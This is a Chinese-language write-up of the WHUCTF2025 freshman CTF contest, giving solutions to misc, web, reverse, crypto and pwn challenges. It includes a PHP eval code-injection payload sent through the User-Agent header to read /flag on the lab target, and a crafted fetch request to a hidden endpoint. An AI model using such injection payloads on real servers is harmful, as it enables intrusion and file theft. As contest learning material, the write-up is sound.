---
title: Tzxy's WHUCTF2025新生赛WP
author: 1so
date: 2025-10-24
categories:
- [CTF, WP, WHUCTF2025新生赛]
tags:
  - CTF
  - WP
  - WHUCTF2025新生赛
---

# Tzxy's WHUCTF2025新生赛WP

作者：Tzxy
战果：总榜第6，2025级第六，得分2747，解题数17
*这个成绩看上去疑似很好看实则惊天大混子，只会梭的一集，又因为这次题目恶心+难，把不少只打一个方向的选手挤下去了。*
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027003242.png>)
写在前面：
也是第一次写WP，写的不好的地方请大家指出！
人人都在抢血，只有我在爆零。
虽然本身不觉得**生日**这天打新生赛会愉悦，但没想到这么恶心人，生理上的想吐了，险些发烧。
==***WSRX真是太恶心人了，咱是一定得用这个东西吗？？？？？***==
感谢ChatGPT、Deepseek、Gemini、Qwen对本人的大力支持。
# Misc
## Div4
### F0rensics-truly_easy_pcap
*此题由于出题人5min极速出题而未验题的疏忽导致本人附件解出的flag有小小的问题。后来附件重上了。*
随波逐流，USB键盘流量提取，得到
```
<CAP>t<CAP>his<SPACE>is<SPACE>a<SPACE>truly<SPACE>easy<SPACE>forensics<SPACE>challenge.<SPACE><CAP>i<CAP>f<SPACE>you<SPACE>have<SPACE>read<SPACE>my<SPACE>blog,<SPACE>yoouu<DEL><SPACE>can<SPACE>get<SPACE>the<SPACE>flag<SPACE>easily<SPACE>by<SPACE><DEL><DEL><DEL>via<SPACE>script.<SPACE><CAP>whuctf<CAP>[a-truly-<CAP>ez<CAP>--one]<SPACE><CAP>h<CAP>ope<SPACE>you<SPACE>can<SPACE>like<SPACE>it.e
```
即`WHUCTF{a_truly_EZ_-one}`
交flag发现出问题了，出题人把题目下了之后重上。
即`WHUCTF{a_truly_EZ_one}`
## Div3
### 猫咪日记01
略，随波逐流一把梭了。
### 梅林午餐肉
`meat.txt`中字符为：
```
CCBCBCBCBCCCCCCCCBBC CCCBBCBBCBCBBCCBCCBC CBCBBCCCCCCBCCBCCBCC BCCCBCBBCCCBBCBBCBCC CCCCCCBBCCBCBBCCBCBBCBBCBBCCCCCCBCC
```
C换成A之后
```
AABAB ABABA AAAAA AABBA AAABB ABBAB ABBAA BAABA ABABB AAAAA ABAAB AABAA BAAAB ABBAA ABBAB BABAA AAAAA ABBAA BABBA ABABB ABBAB BAAAA AABAA
```
bacon解密得到`flagdontmakesnowanymore`
即`flag{dont_make_snow_anymore}`
### AI problem 1
> AI题就是要AI一把梭。WP也该让AI写。
#### 分析权重文件提取密钥
首先对 `mnist_cnn_weights.pth` 进行反查，可以用以下命令：
```import torch sd = torch.load("mnist_cnn_weights.pth", map_location="cpu") print(sd.keys())```

在 key 名中可以看到两个非常显眼的字段：
`XOR_KEY_PART1_CIALLO0d000721 XOR_KEY_PART2_998244353ISAPRIME`

由此可知题目提示的“简单加密”即为 **XOR 异或加密**，且密钥被分成两段，拼接顺序应为：
`CIALLO0d000721998244353ISAPRIME`
#### 分析模型结构
根据权重参数形状推断网络结构如下：

`class Model(nn.Module):     def __init__(self):         super().__init__()         self.conv1 = nn.Conv2d(1, 32, 3, padding=1)         self.pool  = nn.MaxPool2d(2,2)         self.conv2 = nn.Conv2d(32, 64, 3, padding=1)         self.fc1   = nn.Linear(64*7*7, 128)  # 对应 XOR_KEY_PART2_*         self.fc2   = nn.Linear(128, 10)      # 对应 XOR_KEY_PART1_*`

推理流程为：

`conv1 → ReLU → pool → conv2 → ReLU → pool → flatten → fc1 → ReLU → fc2`

这与典型的 MNIST CNN 结构一致。
#### 训练新模型
题目要求在 `modified_mnist` 上训练一个新模型。使用相同结构即可：

`python train_new_model.py \   --train_images modified_mnist/train-images-idx3-ubyte \   --train_labels modified_mnist/train-labels-idx1-ubyte \   --epochs 5 --subset 60000 --save_path mnist_cnn_new.pth`

训练完成后，模型会保存为 `mnist_cnn_new.pth`，用于推理阶段。
#### 推理与加密生成
编写 `solve_flag.py`：
1. **加载模型（或 remap 原权重层名）**
2. **递归读取 `imgs/` 文件夹下所有图片**
3. **按自然顺序排序（确保 0,1,2,…,99,100）**
4. **依次推理，拼接数字成十进制串**
5. **转为十六进制密文**
得到类似输出：
`Digits length: 101 Digits preview: 4215518351573... Hex ciphertext: 4d17b14d88dca83f...`
#### 解密过程
根据密钥提示“XOR_KEY_…”，直接对密文进行循环 XOR 解密：
`def xor_decrypt_hex(hex_str, key):     ct = bytes.fromhex(hex_str)     return bytes(b ^ key[i % len(key)] for i, b in enumerate(ct))`

两种顺序都尝试：
`key1 = b"CIALLO0d000721998244353ISAPRIME" key2 = b"998244353ISAPRIMECIALLO0d000721"`

最终解密出正确的明文（flag）
即`flag{3464ea41-a5ac-11f0-a8d4-00155daa324f}`

## Div2
### 猫咪日记02
txt中一大串颜文字，AAencode解密得到`alert("{miao~}“`
然后从此卡了鄙人26个小时。hint出出出，题解数upupup，心态crackcrackcrack。
对`hint.zip`使用脚本读取CRC值如图：
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251026093539.png>)
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251026100152.png>)
脚本项目地址：
1. https://github.com/AabyssZG/CRC32-Tools
2. https://github.com/theonlypwner/crc32

搜索Tupper，后知后觉地得知有一个`Tupper's Self-Referential Formula`，搜索相关脚本，带入神秘数字跑出来如图：
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251026123021.png>)
脚本为：
```python
#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
  
from __future__ import annotations  
  
def Tupper_self_referential_formula():  
    # Tupper's self-referential constant k  
    k = 180212012173722546561719108170953334945646509575257766053044972614265432006938605954778788954249917317874987474396645113333162619982013630555276705102826832574191933210789395597050420494318310443820679323957025759068941359912773974918072622601535881121994362965041888217678234174696761773720471697547167376729059011208307138160491271226258006712007525850361882511229655041423592248503655084852821780262006797045449818301088203708530121687453872764956524342891129441733245403136  
  
    def f(x: int, y: int) -> bool:  
        # d is always <= 0 for x>=0 and 0<=y%17<=16  
        d = (-17 * x) - (y % 17)  
        # e = 2 ** (-d) using bit shift for big integers  
        e = (1 << (-d)) if d < 0 else 1  
        g = ((y // 17) // e) % 2  
        return 0.5 < g  # i.e., g == 1  
  
    lines = []  
    for y in range(k + 16, k - 1, -1):  
        line = ""  
        for x in range(0, 107):  
            line += "@" if f(x, y) else " "  
        lines.append(line)  
    return "\n".join(lines)  
  
if __name__ == "__main__":  
    print(Tupper_self_referential_formula())
```
`GOOD]#Y`即为`flag.zip`的密码，解压得flag。
### 旧依老色批
得到`蒯老.png`，搜索得知老蒯是一个词，可知这题主基调为**反转**。
使用`010Editor`打开文件，发现最末hex为`74 E4 05 98`，反转后为`89 50 4E 47`，即.png文件的文件头。编写脚本将所有hex反转后得到`fixed.png`，脚本如下：
```python
def reverse_hex_file(input_file, output_file):
    """
    将文件的十六进制表示完全反转
    例如: 28 06 24 EA -> AE 42 60 82
    """
    try:
        # 读取原始文件
        with open(input_file, 'rb') as f:
            original_data = f.read()
        
        # 将整个数据转换为十六进制字符串
        hex_string = original_data.hex()
        
        # 反转十六进制字符串
        reversed_hex = hex_string[::-1]
        
        # 将反转后的十六进制字符串转换回字节
        reversed_data = bytes.fromhex(reversed_hex)
        
        # 写入新文件
        with open(output_file, 'wb') as f:
            f.write(reversed_data)
        
        print(f"✅ 文件已成功处理!")
        print(f"输入文件: {input_file}")
        print(f"输出文件: {output_file}")
        
        # 显示前后对比
        print(f"\n原始文件:")
        print(f"  文件头: {original_data[:8].hex(' ').upper()}")
        print(f"  文件尾: {original_data[-8:].hex(' ').upper()}")
        
        print(f"\n反转后文件:")
        print(f"  文件头: {reversed_data[:8].hex(' ').upper()}")
        print(f"  文件尾: {reversed_data[-8:].hex(' ').upper()}")
        
    except Exception as e:
        print(f"处理文件时出错: {e}")

# 运行脚本
if __name__ == "__main__":
    input_file = "蒯老.png"
    output_file = "fixed.png"
    
    reverse_hex_file(input_file, output_file)
```
得到`fixed.png`，带派！
然后卡了26个小时。hint出出出，题解数upupup，心态crackcrackcrack。还被sishijiu疯狂压力。

> 你别告诉我你stegsolve不会打开。
> 原来你是梭狗吗。
> ——sishijiu

“啊对还真是，我就是个臭混分的，别骂了球球了。”

LSB，用`Stegsolve`提取数据，如图：
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251026115705.png>)
得到密文`^D>,C?Td+QI;SxjS n}&gP,jB`
扔进随波逐流，在`base91`解码这一栏，得到`flag.zip`的密码，`da1_p1e_bu_L4o_t1e?`
实在是很不起眼了。
得到flag。

# Web
## Div3
### U5er0Agent
打开网页后得到提示，查看源代码。
```php
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $user_agent_string = $_SERVER['HTTP_USER_AGENT'];
    
    $processing_result = $system_processor->processUserInput($user_agent_string);
```
经过`processUserInput`，
```php
    public function processUserInput($input_data) {
        $validation_result = $this->validateInputString($input_data);
        
        if ($validation_result['status'] === 'VALID') {
            $this->logEvent('VALIDATION_PASS', 'Input validation successful');
            return $this->executeSecureCode($input_data);
```
跳转至`executeSecureCode`，
```php
    private function executeSecureCode($code_fragment) {
        $this->logEvent('EXECUTION_START', 'Beginning secure code execution');
        
        try {
            eval($code_fragment);
```
看出是`eval RCE`，构造命令：
```bash
curl -s http://127.0.0.1:10160/ -H 'User-Agent: echo file_get_contents(base64_decode("L2ZsYWc="));'
```
或者修改请求头：
```css
User-Agent: echo file_get_contents(base64_decode("L2ZsYWc="));
```
得到flag，即`WHUCTF{k1C_kRaZy_7hur5DAY_v_ME_5o_NOw_pIZZzz2z}`

## Div2
### 井字棋小游戏
读取源码喂给AI
关键信息从源码里可读出来：
- 接口路径：`/fl4gggg_gy56dwdccfs_l`
- 方法：`POST`
- 头：`Content-Type: application/json`
- 请求体：`{"winner":"player___"}`  
    （注意是 `"pla" + "yer___"` 拼起来 → **`player___`**，包括 3 个下划线）
- 返回 200 就会弹出：`flag: <响应体>`

控制台执行
```js
fetch('/fl4gggg_gy56dwdccfs_l', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  // 注意 winner 的值必须是精确的 "player___"
  body: JSON.stringify({ winner: 'player___' }),
  credentials: 'same-origin' // 以防需要同源 Cookie
})
  .then(r => r.text())
  .then(t => console.log('flag:', t))
  .catch(console.error);
```
得到flag
### apacherrr
没错这个题我根本没做，本来打算做的，我开这一栏纯粹为了控诉WSRX这个恶心人的玩意。

# Reverse
## Div3
### 签到
用IDA找到main函数，之后GPT一把梭。
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027170502.png>)
即`WHUCTF{welcome_to_reverse-eqe}.exe`
### ezbase
base64解码，但是有自定义的表，即
```
vBCDEFGHIJKLMNOPQRSTUVWXYZAbcdefghijklmnoqprstuawxyz0123456789+/
```
解码得flag，即`whuctf{6@se64_1s_very_3@sy-zxz}.exe`

# Crypto
~~Crypto咱喵打算只混个签到的分喵，轻喷喵。~~
二编：没想到混分全靠cry，我都要cry了。
## Div3
### Sign_in
GPT一把梭。
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027170623.png>)
得到解题脚本：
```python
import base64
from math import isqrt

# 给定数据
c = int("15691004504992202032317971693949709648608175940878393465837825142986280288184965855974178982689952527073808372247720945348821365168885324128527799693228889914393109318704373025840689358899237597494810359055931557241343088202760358423171744734123364512635441755121622909939466041406721396057669768857826559046")

pem_lines = [
"MIICWwIBAAKBgFDb9Iw0F251NHb7jZlQxlDebK5SKICKb5NAthhauYPVEY0eHH/e",
"fKl3mOtmaIK0SvGNrhg3rKwENplM27pqSDflUk9vmYPHRE16SNxUb4cCx9/HiqV7",
"uc/0m7iKzWuEEsLYliYIzOboEfLDXYmNj82pS1/834SdcQ4GwfJ6SUs/AgMBAAE",
]
b64 = "".join(pem_lines)
b64 += "=" * ((4 - len(b64) % 4) % 4)
der = base64.b64decode(b64)

# 解析 ASN.1：SEQUENCE -> version -> modulus n -> exponent e
i = 0
def read_len(data, i):
    l = data[i]; i += 1
    if l & 0x80:
        n = l & 0x7F
        val = 0
        for _ in range(n):
            val = (val << 8) | data[i]; i += 1
        return val, i
    else:
        return l, i

assert der[i] == 0x30; i += 1          # SEQUENCE
_, i = read_len(der, i)
assert der[i] == 0x02; i += 1          # INTEGER (version)
l, i = read_len(der, i); i += l
assert der[i] == 0x02; i += 1          # INTEGER (modulus n)
ln, i = read_len(der, i)
n = int.from_bytes(der[i:i+ln], 'big'); i += ln
assert der[i] == 0x02; i += 1          # INTEGER (exponent e)
le, i = read_len(der, i)
e = int.from_bytes(der[i:i+le], 'big'); i += le
assert e == 65537

# 费马分解（p,q 很接近）
a = isqrt(n)
if a * a < n: a += 1
while True:
    b2 = a*a - n
    b = isqrt(b2)
    if b*b == b2:
        p, q = a - b, a + b
        break
    a += 1

# 还原 d，解密
phi = (p - 1) * (q - 1)
def egcd(a, b):
    if b == 0: return (a, 1, 0)
    g, x, y = egcd(b, a % b)
    return (g, y, x - (a // b) * y)

def invmod(a, m):
    g, x, _ = egcd(a, m)
    if g != 1: raise ValueError("no inverse")
    return x % m

d = invmod(e, phi)
m = pow(c, d, n)
k = (n.bit_length() + 7) // 8
pt = m.to_bytes(k, 'big')
# 去掉前导 0
pt = pt[next((i for i,b in enumerate(pt) if b!=0), len(pt)):]
print(pt.decode('utf-8', errors='ignore'))
```
即`WHUCTF{Y0u_succe5sfully_ch3ckin9_1n_t0_Cryp7ography!}`

## Div2
### Glowing
拷打AI得到脚本：
```python
# solve.py
import string

hex_blocks = [
"0x162e21262621171844112a436d247f1c2e2d07720b3f545b7f0e5259177f4d040e03690745192b18",
"0x3368373a740e121a52432a10182037153d3e4333173417473e1f13511c2d54090b572808425c355d",
"0x5293b63192f0f16585463472c367f04233e00371d705e5e7f0d13531a395f091d12271a165a2b1c",
"0x243b75252629165747592610223137113d2c433b17705a593b085f52532c5a0400182540166d2f18",
"0x772e3c353166171e4554635234652b1c2a7f00201c355310300a135a123657180e1e2707585e6709",
"0x3f2d3c317420091e565f2743252c2f4f6f360d721833545f2d085259103a191b0603214e5d5c220d",
"0x3e263263202e1e1e411130442c312a076f2e163d557043583a15135f12295c4c0e576b1c594c2015",
"0x7a29272c21281f5a4759261d282138113c7d43331c2343583a185a54533e57084f03210b5f4b6710",
"0x223b3c2074251e19475431436d2a31543b37063b0b705451320d4156173a4b050a59693a5e5c6713",
"0x36253063372916124011254222287f00273a431717375b592c041343162d544c09183b4e4251225d",
"0x322e332637325b185d11375828652c1f367f053d153c584736025417127f4a1901042c1a1a193409",
"0x3225382a3a215b11415e2e10392d3a54292d0a37173444102d0954421f3e4b0016573e0f425a2f14",
"0x392f75373c235b04465f305539652b1b283a173a1c221979314c475f167f5802061a2c1d164a221e",
"0x3826316327231a045c5f6f100c232b113d380f3d0e7047512d185a541a2f58180a0469075819265d",
"0x24203a33242f151013552a43393736173b7f05370a245e463e0013401a2b514c3f18391e5f57171c",
"0x253c2c6f7420141b5f5e345529653d0d6f2b0b37593c56442b094144532c5c00095a3a1e59573412",
"0x252d3163382f0d121d11175828653d15213b4321123947437f185b525318501e0304692c5757235d",
"0x1420342f3823151056112a5e6d3137116f2b0b3b0b3417433a0d40581d7f5d190a573d01164a2415",
"0x322c202f3d281c57505e2d56212c3c003c7143131f24524238005c405337581f4f03211c535c671f",
"0x36263163273214055a543010242b7f33262d0f215912565e3b4c6356012b404d55576b2f504d220f",
"0x30243a3478662f1f5611105120207f353c7f223e0e314e437d4c5558102a4a091c572600166b2613",
"0x2468272638270f1e5c5f305824357f03262b0b7211354510390d475f162d190d011369065f4a6719",
"0x3e3b343324341401525d635f2b652b1c2a7f013317340c107d385a52177f4d034f03210b166a2c14",
"0x323b776326230d185f4726102c373001213b433a1c2217572d0344431b7f58020b57210b4419251c",
"0x392c382220230857555422423e652b1c2e2b432611354e103e1e5617113a50020857250b504d671f",
"0x32203c2d307d5b165d556312022b3a54203943070a72175630005f58042c19180712690c5757235d",
"0x32262126262f151013452b556d083a18203b0a3159025659314c5e4200365a4c0a012c004217",
]

# 解析为字节数组（按大端，不补最高位的 0；每对密文做最短长度 XOR）
cts = []
for h in hex_blocks:
    v = int(h, 16)
    b = v.to_bytes((v.bit_length()+7)//8, 'big') if v > 0 else b'\x00'
    cts.append(b)

n = len(cts)
max_len = max(len(c) for c in cts)

def is_alpha(x: int) -> bool:
    return 65 <= x <= 90 or 97 <= x <= 122

# ------- 第 1 阶段：空格探测拿一版密钥 -------
candidate_space = [ [0]*len(cts[i]) for i in range(n) ]
for i in range(n):
    for j in range(i+1, n):
        m = min(len(cts[i]), len(cts[j]))
        for k in range(m):
            # 若 C_i ^ C_j ^ 0x20 呈现为字母，说明 i 或 j 该位大概率为空格
            if is_alpha((cts[i][k] ^ cts[j][k]) ^ 0x20):
                candidate_space[i][k] += 1
                candidate_space[j][k] += 1

threshold = n // 2  # 半数以上认为是空格
ks = [None]*max_len
for k in range(max_len):
    for i in range(n):
        if k < len(cts[i]) and candidate_space[i][k] > threshold:
            ks[k] = cts[i][k] ^ 0x20  # K = C ^ ' '

# ------- 第 2 阶段：按列打分细化密钥 -------
ascii_printable = set(range(32, 127))
letters = set(range(ord('A'), ord('Z')+1)) | set(range(ord('a'), ord('z')+1))
digits  = set(range(ord('0'), ord('9')+1))
common_punct = set(map(ord, " ,.;:-_{}()'\"!?/"))
allowed_flag  = set(map(ord, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"))

def refine_pos(k, seed=None):
    # 候选集合由“空格/字母/数字/常见标点”反推得到
    candidates = set()
    for i in range(n):
        if k < len(cts[i]):
            c = cts[i][k]
            candidates.add(c ^ 0x20)
            for ch in letters: candidates.add(c ^ ch)
            for ch in digits:  candidates.add(c ^ ch)
            for ch in common_punct: candidates.add(c ^ ch)
    if seed is not None:
        candidates.add(seed)
    best_s, best_score = None, -1
    for s in candidates:
        printable = alpha = flag_like = 0
        for i in range(n):
            if k < len(cts[i]):
                p = cts[i][k] ^ s
                if p in ascii_printable: printable += 1
                if p in letters or p == 0x20: alpha += 1
                if p in allowed_flag: flag_like += 1
        # 综合打分：更多“可打印/字母或空格/像 flag 的字符”更好
        score = printable + 0.2*alpha + 0.1*flag_like
        if score > best_score:
            best_score, best_s = score, s
    return best_s

for k in range(max_len):
    ks[k] = refine_pos(k, ks[k])

# 解出 flag（密钥流本体）
flag = ''.join(chr(ks[k]) for k in range(max_len))
print("Recovered flag:", flag)

# 顺便把明文解出来，验证一下可读性
for idx, c in enumerate(cts, 1):
    p = bytes(c[i] ^ ks[i] for i in range(len(c)))
    print(f"Block {idx:02d}:", p.decode('ascii', errors='replace'))

```
得到结果：
```python
Recovered flag: WHUCTF{w31C0ME_tO_cRyP70_l37s_9lowIn69G}
Block 01: Afterglow is a hard rock band that is le
Block 02: d by Himari Uehara and was formed after 
Block 03: Ran Mitake was placed in a different cla
Block 04: ss from the others in middle school. The
Block 05:  five live by the creed of maintaining t
Block 06: heir friendship; in accordance with keep
Block 07: ing their status quo, they have a "rough
Block 08: -around-the-edges" aesthetic and their m
Block 09: usic centers on their camaraderie. The n
Block 10: ame comes from the English term for the 
Block 11: effect on the sky following a sunset, st
Block 12: emming from the friends regularly watchi
Block 13: ng the sunset together.In the animes sec
Block 14: ond season, Afterglow participates in a 
Block 15: shopping district festival with PoppinPa
Block 16: rty, followed by the latters self-sponso
Block 17: red live. The band skips the Girls Band 
Block 18: Challenge in the third season due to sch
Block 19: eduling conflicts. Afterglow has three b
Block 20: and stories in Girls Band Party!: "After
Block 21: glow, The Same As Always" focuses on Ran
Block 22: s relationship with her father and his d
Block 23: isapproval of the band; "Tied to the Ski
Block 24: es" revolve around her growth and her ba
Block 25: ndmates fears that they are being left b
Block 26: ehind; and "One of Us" follows the band 
Block 27: entering the Melodic Rain music event.
```
*看得出来Misay确实很邦*
即`WHUCTF{w31C0ME_tO_cRyP70_l37s_9lowIn69G}`
### No_task_file
复现。
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027000959.png>)
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027001432.png>)
于是全部选1
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027001626.png>)
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027001639.png>)
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027001749.png>)
即`WHUCTF{74a0f60c-22ae-4493-b202-53877805aa18}`
### DAWN-AES
拷打GPT，叫我去输入96个0，如图
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027002930.png>)
![图片](</images/CTF/WP/WHUCTF2025新生赛/Pasted_image_20251027003043.png>)
即`WHUCTF{cryptoGraPhY_DREam_lT5_DaWn_4esss_SyStem}`

# Pwn
## Div3
### ncc
nc连接靶机之后cat flag即可。
即`flag{dd2fb9f6-7bc8-4899-98a0-9def2ac46ba0}`


# 写在最后：
大家都辛苦了！感谢陪伴，我相信故事尚未完结。
> 尽管我太平凡。

`Hack for fun not for profit_`
